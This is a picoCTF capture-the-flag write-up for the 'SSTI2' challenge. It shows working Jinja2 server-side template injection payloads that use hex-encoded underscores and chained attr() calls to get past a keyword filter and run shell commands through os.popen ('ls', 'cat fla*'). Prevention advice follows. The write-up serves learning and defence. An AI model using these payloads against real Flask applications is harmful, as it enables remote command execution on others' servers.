## SSTI2

In this challenge, it goes beyond SSTI1 as there is a filtration that blocks special characters.

I started by testing basic Jinja2 expressions to confirm the SSTI vulnerability:

- `{{ 7*7 }} → 49`: This confirmed that Jinja2 was evaluating expressions, indicating an SSTI vulnerability.  
- `{{ ''.__class__ }} → "Stop trying to break me >:("`: This revealed sanitization blocking dangerous attributes like `__class__`.  
- `{{ config }} →` Leaked the Flask configuration, confirming a Flask/Jinja2 environment.  

The sanitization blocked keywords like `__class__`, `__mro__`, and `__subclasses__`, and direct attribute access (e.g., `''['__class__']`) was also filtered.

---

So I tried this payload:

```jinja
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```

Which is equivalent to:

```jinja
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('ls')|attr('read')()}}
```

---

### Step-by-step Execution

**Accessing the Flask Request Object:**  
`request` refers to Flask’s request object, which allows interaction with the current HTTP request.

**Accessing the Application Context:**  
`request|attr('application')` retrieves the Flask application instance from the request object.

**Navigating to Global Variables:**  
`attr('__globals__')` accesses the global variables available within the Flask application.

**Retrieving Built-in Functions:**  
`attr('__getitem__')('__builtins__')` extracts the built-in functions available in Python.

**Accessing Python’s Import Function:**  
`attr('__getitem__')('__import__')('os')` dynamically imports the `os` module, which is essential for executing system commands.

**Executing a Shell Command (ls):**  
`attr('popen')('ls')` uses `os.popen` to run the `ls` command in the system shell.

**Reading the Output:**  
`attr('read')()` retrieves and returns the output of the executed command.

---

![firstFinding](https://github.com/user-attachments/assets/42990a9f-8463-4e13-8a2f-1ccfbcac9923)

Then I tried to read the flag directly:

```jinja
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat fla*')|attr('read')()}}
```

---

![flag](https://github.com/user-attachments/assets/b26d58c8-2cf5-4952-8972-037ad8ba72b4)

**flag:** `picoCTF{sst1_f1lt3r_byp4ss_8b534b82}`

---



# 💡 **Lessons Learned in SSTI Exploitation**

### 🔍 **Understanding SSTI Bypass Techniques**
- Even with filtering mechanisms, **SSTI vulnerabilities can still be exploited** by creatively accessing restricted functions.
- **Hex encoding (`\x5f` for `_`)** is a powerful method for bypassing special character restrictions.
- The **`attr()` filter allows chained access** without dots or brackets, helping evade input sanitization.
- Deep knowledge of **Flask/Jinja2 internals** (`request`, `application`, `__globals__`, `__builtins__`) is key to advanced exploitation.
- If common paths are blocked (e.g., `__class__`), reconstruct the attack chain **indirectly**, such as by leveraging `__import__`.

---

### 🔐 **Preventing SSTI Attacks**
> **Filtering alone is NOT enough!** Proper sandboxing and secure coding practices are essential to mitigate SSTI risks.

✔ **Avoid rendering untrusted input** via `render_template_string()`—this is a common entry point for SSTI.  
✔ **Use safer template engines** that separate logic from content, like **Mustache** or **Jinja2 with sandboxing enabled**.  
✔ **Apply Jinja2’s sandbox environment** (`jinja2.sandbox.SandboxedEnvironment`) to restrict access to dangerous Python internals.  
✔ **Never pass raw user input directly into templates**—always validate or whitelist expected values before rendering.  
✔ For **high-risk applications**, consider **rendering templates server-side only**, without exposing rendering functionality to users.


  
  
